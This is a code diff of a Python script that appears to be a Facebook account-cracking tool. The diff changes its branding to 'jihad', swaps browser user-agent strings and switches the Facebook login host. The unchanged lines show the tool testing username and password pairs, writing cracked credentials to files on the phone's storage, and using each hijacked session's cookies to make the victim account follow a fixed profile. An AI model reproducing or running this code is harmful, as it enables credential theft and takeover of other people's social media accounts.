@@ -235,7 +235,7 @@ def R():
  
 			elif key in ["1", "01"]:
  
-				__xxx__().rifat(id)
+				__xxx__().jihad(id)
  
 			elif key in ["2", "02"]:
  
@@ -271,7 +271,7 @@ class __xxx__:
  
         self.id = []
  
-    def rifat(self,ak):
+    def jihad(self,ak):
  
         if 1 in fuck:
  
@@ -309,7 +309,7 @@ class __xxx__:
  
         global ok,cp,loop
  
-        sys.stdout.write(f"\r \x1b[1;33m[R1F4T]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
+        sys.stdout.write(f"\r \x1b[1;33m[jihad]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
  
         sys.stdout.flush()
  
@@ -381,7 +381,7 @@ class __xxx__:
  
                     "content-type":"application/x-www-form-urlencoded",
  
-                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]",
+                    "user-agent":"Mozilla/5.0 (Linux; Android 13; RMX3710 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
  
                     "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  
@@ -399,7 +399,7 @@ class __xxx__:
  
                     "accept-encoding":"gzip, deflate br",
  
-                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
+                    "accept-language":"en-GB,en-US;q=4.0,en;q=5.0"
  
                 }
  
@@ -409,13 +409,13 @@ class __xxx__:
  
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
  
-                    print(f"\r{H} [R1F4T-OK 💥] {user} | {pw}")
+                    print(f"\r{H} [jihad-OK 💥] {user} | {pw}")
  
                     wrt = '%s|%s' % (user,pw)
  
                     ok.append(wrt)
  
-                    open('/sdcard/RIFAT_OK.txt' , 'a').write('%s\n' % wrt)
+                    open('/sdcard/jihad_OK.txt' , 'a').write('%s\n' % wrt)
  
                     self.follow(session,coki)
  
@@ -439,7 +439,7 @@ class __xxx__:
  
                         cp.append(wrt)
  
-                        open('/sdcard/RITU_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('/sdcard/Jihad_CP.txt' , 'a').write('%s\n' % wrt)
  
                         break
  
@@ -461,7 +461,7 @@ class __xxx__:
  
                     cp.append(wrt)
  
-                    open('/sdcard/RITU_CP.txt' , 'a').write('%s\n' % wrt)
+                    open('/sdcard/Jihad_CP.txt' , 'a').write('%s\n' % wrt)
  
                     break
  
@@ -477,11 +477,11 @@ class __xxx__:
  
     def follow(self, session, coki):
  
-        r = BeautifulSoup(session.get('https://mbasic.facebook.com/AliBaloch356', cookies={'cookie': coki}).text, 'html.parser')
+        r = BeautifulSoup(session.get('https://p.facebook.com/AliBaloch356', cookies={'cookie': coki}).text, 'html.parser')
  
         get = r.find('a', string='Ikuti').get('href')
  
-        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
+        session.get(('https://p.facebook.com' + str(get)), cookies={'cookie': coki}).text
  
     def __pler__(self):
  
